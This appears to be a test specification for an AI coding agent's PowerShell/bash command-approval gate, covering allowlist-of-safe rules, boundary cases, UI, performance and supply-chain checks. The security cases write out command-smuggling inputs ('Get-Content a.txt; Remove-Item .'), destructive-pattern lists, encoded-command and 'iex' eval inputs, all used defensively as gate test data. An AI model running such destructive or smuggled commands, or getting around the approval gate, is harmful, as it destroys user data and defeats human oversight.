| **ID** | TC-315 (UT-41) |
| **Priority** | High |
| **Type** | Business Rule — Security |
| **Level** | UT — vitest (data-driven over `testdata/allowlist-safe-testdata.csv`) |
| **Requirement** | SEC-02 (High) allowlist-of-safe posture; BR-10; NFR-SEC-01/02 (TDD §8.4); §7.3.3 `READONLY_PS_PATTERNS` |
| **Preconditions** | Gate handler wired per TDD v1.2; `READONLY_PS_PATTERNS` anchored (whole-command), compound statements rejected unless every segment safe |

> **SEC-02 authority:** a powershell command auto-approves IF AND ONLY IF it (i) is statically understandable (`decoded`), (ii) does NOT match `DESTRUCTIVE_PS_PATTERNS`, and (iii) matches `READONLY_PS_PATTERNS`. This replaces name-set membership entirely.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | For each allowlisted safe command (`Get-ChildItem .`, `Get-Content a.txt`, `Test-Path x`, `Get-Item x`, `Get-Location`, `Select-String p f`, `ls`, `cat a`, `pwd`, `gci`) call `requestApproval` in BOTH modes | ALL → `approved: true`, reason `Read-only PowerShell command auto-approved` |
| 2 | Compound smuggle: `Get-Content a.txt; Remove-Item .` | PENDS — compound rejected (destructive segment present); anchored allowlist does not match whole command |
| 3 | Unanchored smuggle: `echo safe && Remove-Item .` | PENDS — not every segment safe |
| 4 | Non-allowlisted but harmless cmdlet: `Get-Random` | PENDS — not in `READONLY_PS_PATTERNS` → over-pend (NFR-SEC-02 accepted residual, see TC-410) |

**Test Data:** `testdata/allowlist-safe-testdata.csv` (safe matches) + smuggle/non-allowlist negatives
**Postconditions:** Only positively-recognized safe commands auto-approve; no over-approval
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

## 5. Boundary & Negative Testing

### TC-400: workspaceRoot empty string → handled gracefully

| Field | Value |
|-------|-------|
| **ID** | TC-400 (UT-26) |
| **Priority** | Medium |
| **Type** | Boundary / Negative |
| **Level** | UT — vitest |
| **Requirement** | UC-002 boundary; FSD §3.2.5 ("Invalid workspace root"); TDD §3.1 error table |
| **Preconditions** | Function importable |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools('')` | Returns `[]` (TDD §3.1: workspaceRoot empty → return `[]`) — no crash |
| 2 | Call `buildWorkspaceSystemPrompt('')` | Prompt contains `Workspace root: (unknown)` — no crash |

**Test Data:** workspaceRoot = `''`
**Postconditions:** System stable
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-401: workspaceRoot relative path → rejected

| Field | Value |
|-------|-------|
| **ID** | TC-401 (UT-27) |
| **Priority** | Medium |
| **Type** | Boundary / Negative |
| **Level** | UT — vitest |
| **Requirement** | UC-002 boundary; FSD §3.2.5, §5.1 ("Must be absolute path") |
| **Preconditions** | Function importable |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools('relative/path')` | Rejected or handled per contract: "Invalid workspace root" — no tools created against relative path |
| 2 | Verify no partial state | No tool objects referencing relative root |

**Test Data:** workspaceRoot = `relative/path`
**Postconditions:** System stable
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-402: workspaceRoot non-existent absolute path → graceful handling

| Field | Value |
|-------|-------|
| **ID** | TC-402 (UT-28) |
| **Priority** | Medium |
| **Type** | Boundary / Negative |
| **Level** | UT — vitest |
| **Requirement** | UC-002 boundary; FSD §3.2.5 |
| **Preconditions** | Function importable |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools('C:\\nonexistent-root-xyz-123')` | Handled gracefully — tool creation attempted; error caught if tools require existing root; no crash |
| 2 | Verify prompt path | `buildWorkspaceSystemPrompt('C:\\nonexistent-root-xyz-123')` still returns prompt with root verbatim |

**Test Data:** workspaceRoot = `C:\nonexistent-root-xyz-123`
**Postconditions:** System stable
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-403: toolName empty string → require-approval under default Supervised (fail-secure)

| Field | Value |
|-------|-------|
| **ID** | TC-403 (UT-29) |
| **Priority** | Medium |
| **Type** | Boundary / Negative — Security |
| **Level** | UT — vitest |
| **Requirement** | UC-003 boundary; TDD §7.4 input validation; TDD v1.1 §1.4 fail-secure principle (mode-scoped) |
| **Preconditions** | Gate handler wired; default Supervised mode (`getMode()` unwired) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `classifyToolCall('', {})` under default Supervised mode | Returns `require-approval` — empty tool name not in any allow set → pend (fail-secure default); under Autopilot the unknown-safe classifier would auto-approve (TDD v1.1 §7.2) |
| 2 | Verify no crash | No exception escaping |

**Test Data:** toolName = `''`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-404: command empty string for powershell → PENDS (fail-secure, FLIPPED in v1.2)

| Field | Value |
|-------|-------|
| **ID** | TC-404 (UT-30) |
| **Priority** | High |
| **Type** | Boundary / Negative — Security |
| **Level** | UT — vitest |
| **Requirement** | UC-003 boundary; TDD v1.2 §3.2 Step 1c, §8.4 (TC-404 semantics flipped); SEC-02 deny-by-default |
| **Preconditions** | Gate handler wired per TDD v1.2 (allowlist-of-safe) |

> **⚠️ v1.2 FLIP (SEC-02):** this test previously expected `auto-approve` for an empty command (powershell ∈ READ_ONLY_TOOLS). Under the allowlist-of-safe posture, an empty command matches NEITHER `DESTRUCTIVE_PS_PATTERNS` NOR `READONLY_PS_PATTERNS` → deny-by-default → **PEND** (TDD §3.2 Step 1c, §8.4). FSD TC-404 narrative must be updated by BA (TDD §8.4 OQ-9, non-blocking); this STC treats empty-command-PENDS as authoritative.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'powershell', input: { command: '' } })` in BOTH modes | `res.approved === false` (PEND) — empty command has no safe-allowlist match → deny-by-default; mode-independent |
| 2 | Call with `input: { command: null }` | `String(null ?? '')` → `''` → same PEND result; no crash |
| 3 | Verify audit flag | Decision logged with `matchedPattern = NO_SAFE_MATCH_PENDED` (SEC-05) |

**Test Data:** command = `''` and `null`
**Postconditions:** No empty-safe auto-approval (fail-secure)
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-405: Mixed-case destructive command → require-approval (case-insensitive patterns)

| Field | Value |
|-------|-------|
| **ID** | TC-405 (UT-31) |
| **Priority** | Medium |
| **Type** | Boundary / Negative — Security |
| **Level** | UT — vitest |
| **Requirement** | UC-003, BR-11; TDD §7.3 patterns use `/i` flag |
| **Preconditions** | Gate handler wired |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `classifyToolCall('powershell', { command: 'REMOVE-ITEM -recurse' })` | Returns `require-approval` — case-insensitive match |
| 2 | Call `classifyToolCall('powershell', { command: 'sToP-Process -Name x' })` | Returns `require-approval` |

**Test Data:** commands = `REMOVE-ITEM -recurse`, `sToP-Process -Name x`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-406: args null/undefined command → no crash

| Field | Value |
|-------|-------|
| **ID** | TC-406 (UT-32) |
| **Priority** | Medium |
| **Type** | Boundary / Negative |
| **Level** | UT — vitest |
| **Requirement** | UC-003 boundary; TDD v1.2 §3.2 Step 1c + §7.4 (SEC-08 fail-secure on missing `command`) |
| **Preconditions** | Gate handler wired per v1.2 (zod-validated input, deny-by-default) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'powershell', input: {} })` (command key absent) | No crash; zod `safeParse` fails / empty → **PEND** (fail-secure, not auto-approve) — consistent with TC-404 flip |
| 2 | Call `handler.requestApproval({ toolName: 'powershell', input: null })` | No crash — null input → PEND (deny-by-default) |

**Test Data:** input = `{}` and `null`
**Postconditions:** No empty-safe auto-approval
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-407: Fail-secure property — unknown tools mode-scoped: pend under Supervised, auto-approve under Autopilot (Property-Based)

| Field | Value |
|-------|-------|
| **ID** | TC-407 (PBT-04) |
| **Priority** | High |
| **Type** | Boundary / Negative — Security — Property-Based |
| **Level** | PBT — fast-check + vitest |
| **Requirement** | UC-003; TDD v1.1 §1.4 Fail-Secure principle + §7.2 matrix (mode-scoped unknown-safe classifier); FSD §3.3.4 step 4 idealized default = require-approval under Supervised |
| **Preconditions** | Gate/classifier importable; `getMode()` available for mode switching; fast-check available |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Property: for 200 random strings NOT in `{read, grep, find, ls, get_workspace_info, powershell, bash, write, edit, rm, git}`, call `handler.requestApproval({ toolName: randomName, input: {} })` with default Supervised mode (`getMode()` unwired) | Property holds: ALWAYS pends → `approved: false` (`require-approval`) — never auto-approved under Supervised, never `deny` without reason |
| 2 | Same 200 random names with `getMode()` → `'autopilot'` | Property holds: ALWAYS `approved: true` — unknown-safe classifier auto-approves under Autopilot (deliberate MCP design, TDD v1.1 §1.4/§7.2) — mode-scoped, NOT a fail-secure violation |

**Test Data:** 200 random tool names outside known sets (fast-check filtered `fc.string()`); modes = `supervised` (default), `autopilot`
**Postconditions:** None
**File:** `extension/tests/e2e/gate-failsecure.pbt.test.ts`

---

### TC-408: No destructive command combination is auto-approved (Property-Based)

| Field | Value |
|-------|-------|
| **ID** | TC-408 (PBT-05) |
| **Priority** | High |
| **Type** | Boundary / Negative — Security — Property-Based |
| **Level** | PBT — fast-check + vitest |
| **Requirement** | UC-003 AF-2, BR-11; FSD §7.3 destructive patterns |
| **Preconditions** | Gate/classifier importable; fast-check available |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Property: for 200 random command strings built by prepending/appending destructive keywords (`Remove-Item`, `Stop-Process`, `git push`) with random arguments, call `classifyToolCall('powershell', { command })` | Property holds: decision is ALWAYS `require-approval` for any destructive combination |
| 2 | Property: read-only commands (`Get-ChildItem`, `Test-Path`, `Get-Content`) always auto-approve | No false positives on read-only ops |

**Test Data:** 200 random composites: destructive keywords × random args; read-only keywords × random args
**Postconditions:** None
**File:** `extension/tests/e2e/gate-failsecure.pbt.test.ts`

---

### TC-409: Long path (>260 chars) with c:\ → native handling

| Field | Value |
|-------|-------|
| **ID** | TC-409 (IT-06) |
| **Priority** | Low |
| **Type** | Boundary / Negative |
| **Level** | IT — vitest + real pwsh |
| **Requirement** | UC-002, BR-09 (no translation); FSD §3.2.1 |
| **Preconditions** | Real PowerShell tool created; long test path available or created in temp |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Create temp dir tree with depth pushing path > 260 chars: `C:\Users\ASUS\AppData\Local\Temp\opencode\` + 40 nested segments | Path created (PowerShell supports long paths) |
| 2 | Execute `Test-Path '<long-path>'` via PowerShell tool | Returns `True`/native result — no truncation, no `/c/` translation |
| 3 | Clean up temp tree | Removed successfully |

**Test Data:** long path = `C:\Users\ASUS\AppData\Local\Temp\opencode\sa4e336-longpath\` + 40 nested `segNN` dirs
**Postconditions:** Temp tree cleaned up
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts` (integration section)

---

### TC-410: Unrecognized / undecodable PowerShell command → PENDS (deny-by-default)

| Field | Value |
|-------|-------|
| **ID** | TC-410 (UT-42) |
| **Priority** | High |
| **Type** | Boundary / Negative — Security |
| **Level** | UT — vitest |
| **Requirement** | SEC-01/SEC-02/SEC-03; TDD v1.2 §3.2 Step 1c (deny-by-default), §7.3.1 (`decoded === false → pend`) |
| **Preconditions** | Gate handler wired per v1.2; `normalizePsCommand` implemented |

> **Over-pend direction (NFR-SEC-02):** a command that is neither clearly destructive nor on the safe allowlist, OR that cannot be statically understood, PENDS. This is the accepted usability-cost residual — the control never over-approves.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `requestApproval({ toolName: 'powershell', input: { command: 'Get-Random' } })` (understandable, harmless, NOT allowlisted) | PENDS — no `READONLY_PS_PATTERNS` match → deny-by-default (over-pend, not over-approve) |
| 2 | Call with an undecodable encoded payload (`-EncodedCommand <non-utf8-base64>`) | PENDS — `normalizePsCommand(...).decoded === false` → fail-secure |
| 3 | Call with a dynamic-eval command (`iex $runtimeString`) | PENDS — eval → `decoded === false` and/or `/\biex\b/` match |
| 4 | Verify no auto-approve in either mode | All PEND in Supervised AND Autopilot (deny-by-default is mode-independent for powershell) |

**Test Data:** commands = `Get-Random`, `-EncodedCommand <bad-b64>`, `iex $x`
**Postconditions:** No over-approval; over-pend recorded as expected residual
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

## 6. UI/UX Testing

### TC-500: Webview renders TOOL powershell event (category shell)

| Field | Value |
|-------|-------|
| **ID** | TC-500 (E2E-UI-01) |
| **Priority** | High |
| **Type** | UI/UX |
| **Level** | E2E-UI — vitest webview harness / Playwright |
| **Requirement** | UC-003, Story 3 AC-3; FSD §8 Usability ("Webview renders `TOOL powershell` correctly — no hardcoded bash filter"); FSD §10.2 IT-03; OI-6 |
| **Preconditions** | Extension webview harness running (VS Code test host or Playwright page with webview message protocol) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Dispatch a TOOL event with toolName `powershell` through the webview message protocol (as `StreamProtocolAdapter` does) | Event accepted by webview |
| 2 | Assert rendered tool label | Webview displays `TOOL powershell` (not filtered out, not rendered as `TOOL bash`) |
| 3 | Assert category icon class | Category `shell` applied (from `classifyTool('powershell')` → `'shell'`) |

**Test Data:** toolName = `powershell`; expected category = `shell`
**Postconditions:** Webview state consistent
**File:** `extension/tests/e2e/webview-tool-render.e2e.test.ts`

---

### TC-501: Approval dialog appears and resolves for destructive PowerShell command

| Field | Value |
|-------|-------|
| **ID** | TC-501 (E2E-UI-02) |
| **Priority** | High |
| **Type** | UI/UX — Security |
| **Level** | E2E-UI — vitest webview harness / Playwright |
| **Requirement** | UC-003, BR-11, Story 3 AC-2; FSD §3.3.2 step 3; TDD §7.2 |
| **Preconditions** | Extension webview harness running; gate wired with destructive patterns |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Trigger `powershell` tool call with destructive command `Remove-Item -Recurse C:\temp\test` | Approval dialog appears (approval pending notification) |
| 2 | Verify dialog content | Dialog identifies tool `powershell` and the command |
| 3 | Click "Approve" in dialog | Command execution proceeds; dialog dismissed |
| 4 | Repeat with "Reject" | Command blocked; agent receives rejection |

**Test Data:** command = `Remove-Item -Recurse C:\temp\test` (on scratch path)
**Postconditions:** Gate state consistent; no orphan pending entries
**File:** `extension/tests/e2e/webview-approval-dialog.e2e.test.ts`

---

### TC-502: PowerShell icon/label renders correctly in webview (visual)

| Field | Value |
|-------|-------|
| **ID** | TC-502 (SIT-01) |
| **Priority** | Medium |
| **Type** | UI/UX — Visual |
| **Level** | SIT — Manual (visual only) |
| **Requirement** | UC-003, Story 3 AC-3; FSD §8 Usability; OI-6 |
| **Preconditions** | Extension v1.46.7 installed in VS Code/Kiro; chat panel open; agent session with powershell loadout |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Ask the agent (chat panel) to run a read-only PowerShell command, e.g. `Get-ChildItem` on workspace | Agent executes via `powershell` tool |
| 2 | Visually inspect tool event rendering in webview | `TOOL powershell` label renders correctly; icon/label appropriate for PowerShell (no hardcoded bash filter artifacts) |
| 3 | Take screenshot as evidence | Saved to `evidence/TC-502-powershell-icon.png` |

**Test Data:** prompt = "List the files in the workspace root using PowerShell"
**Postconditions:** None
**Evidence:** `evidence/TC-502-powershell-icon.png`

---

### TC-503: Chat UX — agent executes PowerShell commands instead of narrating

| Field | Value |
|-------|-------|
| **ID** | TC-503 (SIT-02) |
| **Priority** | Medium |
| **Type** | UI/UX — Behavioral |
| **Level** | SIT — Manual (visual/behavioral) |
| **Requirement** | UC-002; FSD §3.4 (system prompt "execute tools, don't print commands"); TDD §3.5 |
| **Preconditions** | Extension installed; chat session active on Windows |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Ask the agent: "Count the .ts files under extension/src/pi-workflow" | Agent uses PowerShell tool (or ls/find) to execute — NOT printing shell commands as text for user to run |
| 2 | Verify paths used | Commands use `c:\...` or `c:/...` paths natively — no Git-Bash `/c/` dialect in agent output |
| 3 | Verify result correctness | Reported count matches actual count (e.g., 27+ .ts files) |
| 4 | Take screenshot as evidence | Saved to `evidence/TC-503-chat-ux.png` |

**Test Data:** prompt = "Count the .ts files under extension/src/pi-workflow"
**Postconditions:** None
**Evidence:** `evidence/TC-503-chat-ux.png`

---

## 7. Non-Functional Testing

### TC-600: PowerShell tool init time < 500ms

| Field | Value |
|-------|-------|
| **ID** | TC-600 (IT-07) |
| **Priority** | Medium |
| **Type** | Non-Functional — Performance |
| **Level** | IT — vitest + real SDK |
| **Requirement** | FSD §8 Performance, §10.3; TDD §8.1; BRD §6 |
| **Preconditions** | Real SDK 0.99.1 installed; warm cache |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Measure duration of `createPowerShellTool(workspaceRoot)` call (5 samples, `performance.now()`) | Median duration < 500ms |
| 2 | Measure full `createWorkspaceTools()` call | < 100ms (TDD §8.1) |

**Test Data:** workspaceRoot = `C:\projects\kiro\SDLC-Agents-4-Enterprise`; samples = 5
**Postconditions:** None
**Acceptance Criteria:** `createPowerShellTool()` < 500ms; `createWorkspaceTools()` < 100ms
**File:** `extension/tests/e2e/performance.e2e.test.ts`

---

### TC-601: PowerShell command execution latency < 2s

| Field | Value |
|-------|-------|
| **ID** | TC-601 (IT-08) |
| **Priority** | Medium |
| **Type** | Non-Functional — Performance |
| **Level** | IT — vitest + real pwsh |
| **Requirement** | FSD §8 Performance, §10.3; TDD §8.1 |
| **Preconditions** | Real PowerShell tool created; workspace exists |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Execute typical command `Get-ChildItem 'C:\projects\kiro\SDLC-Agents-4-Enterprise' -Name` via tool, measure duration (5 samples) | Median latency < 2s |

**Test Data:** command = `Get-ChildItem 'C:\projects\kiro\SDLC-Agents-4-Enterprise' -Name`
**Postconditions:** None
**Acceptance Criteria:** execution < 2s for typical commands
**File:** `extension/tests/e2e/performance.e2e.test.ts`

---

### TC-602: npm install duration < 120s

| Field | Value |
|-------|-------|
| **ID** | TC-602 (E2E-API-10) |
| **Priority** | Medium |
| **Type** | Non-Functional — Performance |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | FSD §10.3; TDD §8.1 |
| **Preconditions** | package-lock.json consistent; npm registry accessible |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npm install` in extension/ with timer | Completes < 120s |

**Test Data:** directory = `extension/`
**Postconditions:** node_modules consistent
**Acceptance Criteria:** npm install < 120s
**File:** `extension/tests/e2e/performance.e2e.test.ts`

---

### TC-603: tsc --noEmit duration < 60s

| Field | Value |
|-------|-------|
| **ID** | TC-603 (E2E-API-11) |
| **Priority** | Medium |
| **Type** | Non-Functional — Performance |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | FSD §10.3; TDD §8.1 |
| **Preconditions** | Dependencies installed |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npx tsc --noEmit -p extension/tsconfig.json` with timer | Completes < 60s with 0 errors |

**Test Data:** tsconfig = `extension/tsconfig.json`
**Postconditions:** None
**Acceptance Criteria:** tsc < 60s
**File:** `extension/tests/e2e/performance.e2e.test.ts`

---

### TC-604: Tool availability ≥ 99.9% — createWorkspaceTools reliability

| Field | Value |
|-------|-------|
| **ID** | TC-604 (IT-09) |
| **Priority** | Medium |
| **Type** | Non-Functional — Reliability |
| **Level** | IT — vitest + real SDK |
| **Requirement** | FSD §8 Reliability, §8.3; TDD §8.3 |
| **Preconditions** | Real SDK 0.99.1 installed |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools(workspaceRoot)` 1000 times in a loop | 1000/1000 succeed (0 failures) — statistical proxy for ≥ 99.9% |
| 2 | Count fallback events | Fallback count recorded for TC-605 |

**Test Data:** iterations = 1000; workspaceRoot = `C:\projects\kiro\SDLC-Agents-4-Enterprise`
**Postconditions:** None
**Acceptance Criteria:** success rate ≥ 99.9% (0 failures in 1000)
**File:** `extension/tests/e2e/performance.e2e.test.ts`

---

### TC-605: PowerShell fallback rate < 5%

| Field | Value |
|-------|-------|
| **ID** | TC-605 (IT-10) |
| **Priority** | Medium |
| **Type** | Non-Functional — Reliability |
| **Level** | IT — vitest + real SDK |
| **Requirement** | FSD §8.3; TDD §8.3 |
| **Preconditions** | TC-604 executed with fallback event counting |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | From TC-604 run: fallbacks / total PS tool creations | Ratio < 5% (expected 0% on healthy machine) |
| 2 | Alert check (TDD §9.2) | `powershell_fallback_total` NOT exceeding 10/min |

**Test Data:** baseline from TC-604 (1000 iterations)
**Postconditions:** None
**Acceptance Criteria:** fallback rate < 5%
**File:** `extension/tests/e2e/performance.e2e.test.ts`

---

### TC-606: Security — destructive matrix per TDD §7.2 (powershell gated both modes; bash mode-scoped)

| Field | Value |
|-------|-------|
| **ID** | TC-606 (IT-11) |
| **Priority** | High |
| **Type** | Non-Functional — Security |
| **Level** | IT — vitest + real gate |
| **Requirement** | BRD §6 Security; FSD §8 Security, §7.3, BR-11; BRD Story 4; TDD v1.2 §7.2 matrix (allowlist-of-safe for PS) + §3.2 Bash note; BRD §1.2 (bash unchanged) |
| **Preconditions** | Real `ToolApprovalGate` + handler wired per v1.2; `getMode()` available for Supervised/Autopilot switching |

> **v1.2 re-scope:** `powershell` is gated by command content under an **allowlist-of-safe** posture (destructive/unparseable pend first; only `READONLY_PS_PATTERNS` auto-approve). `bash` is **NOT identical to PS** — it keeps its pre-upgrade mode-dependent behavior (no content gate, no allowlist). This TC asserts the mode-scoped divergence.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run destructive matrix for `powershell` — all 7 patterns from FSD §7.3 (`Remove-Item`, `rm -`, `Clear-`, `Format-`, `Stop-Process`, `git push`, `git commit`) × BOTH modes (`getMode()` → supervised / autopilot) | ALL 14 decisions = `require-approval` (pend) — `DESTRUCTIVE_PS_PATTERNS` checked FIRST on the normalized command, **mode-independent** (BR-11, fail-secure; TDD v1.2 §3.2 Step 1) |
| 2 | Run same 7 pattern commands with `bash` under default Supervised (`getMode()` unwired) | ALL 7 → `require-approval` (pend) — either the `DESTRUCTIVE_BASH_PATTERNS` content guard or the default supervised path; `bash` is NOT allowlist-driven — pre-upgrade behavior for non-destructive commands, **NOT "identical to PS"** (TDD v1.3 §7.2) |
| 3 | Run same 7 pattern commands with `bash` under Autopilot | Split, by command CONTENT: commands matching `DESTRUCTIVE_BASH_PATTERNS` (`rm …`, `Format-…`) → **`require-approval` mode-independent — SEC-06 CLOSED (SA4E-335 follow-up, TDD v1.3 §3.2 Step 1a-bash)**; the PS-cmdlet-shaped remainder (`Remove-Item`, `Clear-`, `Stop-Process`, `git push`, `git commit`) → `auto-approve` (bash has no PowerShell semantics — unchanged pre-upgrade path) |

**Test Data:** matrix = {`powershell`, `bash`} × {`Remove-Item`, `rm -`, `Clear-`, `Format-`, `Stop-Process`, `git push`, `git commit`} × {supervised, autopilot}
**Postconditions:** No security bypass for `powershell`; destructive **bash command content** gated in BOTH modes (SEC-06 closed); non-destructive bash still mode-scoped and divergent from PS (BRD §1.2)
**Acceptance Criteria:** All destructive PowerShell commands require approval in BOTH modes (FSD NFR §8, honored via allowlist-of-safe); destructive bash command content requires approval in BOTH modes (TDD v1.3 §3.2/§7.2, closes SEC-06); non-destructive bash behavior unchanged and distinct from PS (BRD §1.2)
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-607: Security — workspace paths and command output not leaked to external services

| Field | Value |
|-------|-------|
| **ID** | TC-607 (IT-12) |
| **Priority** | Medium |
| **Type** | Non-Functional — Security |
| **Level** | IT — vitest (log inspection) |
| **Requirement** | FSD §7.2 Data Sensitivity; §7.3 Audit Trail |
| **Preconditions** | Tool execution executed; debug logs captured |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Inspect logs from tool executions (TC-003/TC-204 runs) | Log fields: `toolName`, command (truncated), `exitCode`, `duration` — command truncated per FSD §7.3 |
| 2 | Verify no external transmission | Workspace paths and command output NOT sent to any external service (internal classification respected) |
| 3 | Verify audit retention fields | Approval decision events logged with `toolName`, `decision`, `timestamp` |

**Test Data:** log capture from integration runs
**Postconditions:** None
**Acceptance Criteria:** No path/command leak; audit trail fields present
**File:** `extension/tests/e2e/performance.e2e.test.ts`

---

### TC-608: SEC-05 — Approval decision audit log completeness

| Field | Value |
|-------|-------|
| **ID** | TC-608 (IT-21) |
| **Priority** | High |
| **Type** | Non-Functional — Security — Auditability |
| **Level** | IT — vitest + real gate (log capture) |
| **Requirement** | SEC-05 (Medium); NFR-SEC-04 (TDD §8.4); TDD v1.2 §9.1 `tool_approval` log fields |
| **Preconditions** | Gate handler wired per v1.2; structured log capture enabled |

> **SEC-05:** every `powershell`/`bash` approval decision MUST log the matched pattern/category (or `NO_SAFE_MATCH_PENDED`), the mode, the command hash + length, and the decision — fail-secure pends must be greppable for incident response.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Trigger destructive PS (`Remove-Item -Recurse .`) and capture the `tool_approval` log | Log contains `{ event: "tool_approval", toolName: "powershell", decision: "require-approval", mode, matchedPattern: <destructive category id>, commandHash, commandLength }` |
| 2 | Trigger allowlisted safe PS (`Get-ChildItem .`) | Log `matchedPattern` = `READONLY_<cmdlet>` (e.g., `READONLY_GET-CHILDITEM`), decision `auto-approve` |
| 3 | Trigger non-allowlisted PS (`Get-Random`) and empty command | Log `matchedPattern = NO_SAFE_MATCH_PENDED`, decision `require-approval` — fail-secure pends greppable |
| 4 | Verify command handling | Full command NOT logged verbatim for sensitive cases — `commandHash` + `commandLength` present (SEC-05 truncation-safe) |
| 5 | Verify mode recorded | Each entry records the resolved `mode` (supervised/autopilot) |

**Test Data:** commands = `Remove-Item -Recurse .`, `Get-ChildItem .`, `Get-Random`, `` (empty)
**Postconditions:** Audit entries complete and greppable
**Acceptance Criteria:** All decisions logged with matched pattern/category + mode + hash/length + `NO_SAFE_MATCH_PENDED` flag
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-609: SEC-07 — Dependency supply-chain gate (npm audit + pins + capability check)

| Field | Value |
|-------|-------|
| **ID** | TC-609 (E2E-API-14) |
| **Priority** | High |
| **Type** | Non-Functional — Security — Supply Chain |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | SEC-07 (High, blocking DEV gate before merge); TDD §1.5 constraints, §12 Phase 1; FSD OI-2 |
| **Preconditions** | 0.99.1 installed; `package.json` + `package-lock.json` present |

> **SEC-07:** major bump 0.80.10 → 0.99.1 across 7 `@earendil-works/*` packages + NEW transitive deps `chord`, `pi-mcp`, `pi-codemode`. Mandatory DEV gate before merge.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npm audit --omit=dev --audit-level=high` in extension/ | Exit 0 — **FAIL the test on any High/Critical** advisory |
| 2 | Run `npm ci` (lockfile integrity) | Succeeds — lockfile consistent, no drift |
| 3 | Single-version check — `npm ls @earendil-works/pi-agent-core` | Exactly one resolved `0.99.1` (cross-ref TC-009/TC-303) |
| 4 | Exact-pin check — scan `package.json` for `@earendil-works/*` | All version specifiers are EXACT (`0.99.1`), NO `^`/`~` ranges |
| 5 | Typosquat / unexpected-dep check — diff new transitive packages against expected set | Only expected new deps (`chord`, `pi-mcp`, `pi-codemode`); no unexpected/typosquat packages |
| 6 | `pi-codemode` capability check | Confirm whether it evals model-authored code; if yes → flagged as RCE surface requiring its own gate (documented finding, DEV confirms against actual package) |
| 7 | `pi-mcp` / `pi-codemode` egress check | Confirm no unexpected outbound network calls of command/args/path data (SEC-12) |

**Test Data:** packages = 7 `@earendil-works/*` + `chord`, `pi-mcp`, `pi-codemode`; audit level = high
**Postconditions:** Supply-chain gate green; capability findings recorded
**Acceptance Criteria:** `npm audit` 0 High/Critical; exact pins; single version; expected deps only; `pi-codemode`/`pi-mcp` capability + egress documented
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts` (supply-chain section)

---

## 8. Integration Testing

### TC-700: IT-01 — End-to-end PowerShell execution with c:\ paths

| Field | Value |
|-------|-------|
| **ID** | TC-700 (IT-13) |
| **Priority** | High |
| **Type** | Integration |
| **Level** | IT — vitest + real SDK + real pwsh |
| **Requirement** | FSD §10.2 IT-01; UC-002; Story 2 AC-4 |
| **Preconditions** | Real 0.99.1 SDK; pwsh available; win32 |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Create workspace tools on win32 (real SDK) | Tool named `"powershell"` present |
| 2 | Execute PowerShell command with `c:\` path: `Get-Content 'C:\projects\kiro\SDLC-Agents-4-Enterprise\extension\package.json' -TotalCount 3` | Command executes; returns first 3 lines of package.json |
| 3 | Execute with `c:/` variant: `Test-Path 'c:/projects/kiro/SDLC-Agents-4-Enterprise/extension/package.json'` | Returns `True` — no translation errors |

**Test Data:** commands as listed; workspace = `C:\projects\kiro\SDLC-Agents-4-Enterprise`
**Postconditions:** Workspace unchanged
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts` (integration section)

---

